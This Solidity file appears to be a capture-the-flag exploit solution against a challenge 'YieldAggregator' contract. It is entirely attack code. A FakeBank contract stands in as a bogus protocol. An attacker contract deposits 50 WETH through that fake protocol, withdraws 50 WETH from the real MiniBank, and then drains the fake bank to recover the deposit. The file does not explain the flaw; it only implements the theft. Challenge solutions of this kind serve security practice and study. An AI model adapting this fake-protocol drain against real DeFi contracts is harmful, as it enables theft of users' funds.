// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract FakeBank {

	WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function mint(uint256 amount) public {
    	require(weth.transferFrom(msg.sender, address(this), amount));
    }

    function balanceUnderlying() public view returns (uint256) {
        return weth.balanceOf(address(this));
    }

    function drain() public {
    	require(weth.transfer(msg.sender, weth.balanceOf(address(this))));
    }
}

contract YieldAggregatorAttacker {

    Setup setup;

    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(address _setupAddress) {
        setup = Setup(_setupAddress);
    }

    function attack() public payable {
        require(msg.value == 50 ether);
        YieldAggregator aggregator = YieldAggregator(setup.aggregator());
        MiniBank bank = MiniBank(setup.bank());

        FakeBank fakeBank = new FakeBank();

        weth.deposit{value: msg.value}();
        weth.approve(address(aggregator), type(uint256).max);
        {
            address[] memory _tokens = new address[](1);
            _tokens[0] = address(weth);
            uint256[] memory _amounts = new uint256[](1);
            _amounts[0] = 50 ether;
            aggregator.deposit(Protocol(address(fakeBank)), _tokens, _amounts);
        }
        {
            address[] memory _tokens = new address[](1);
            _tokens[0] = address(weth);
            uint256[] memory _amounts = new uint256[](1);
            _amounts[0] = 50 ether;
            aggregator.withdraw(Protocol(address(bank)), _tokens, _amounts);
        }
        fakeBank.drain();
    }
}
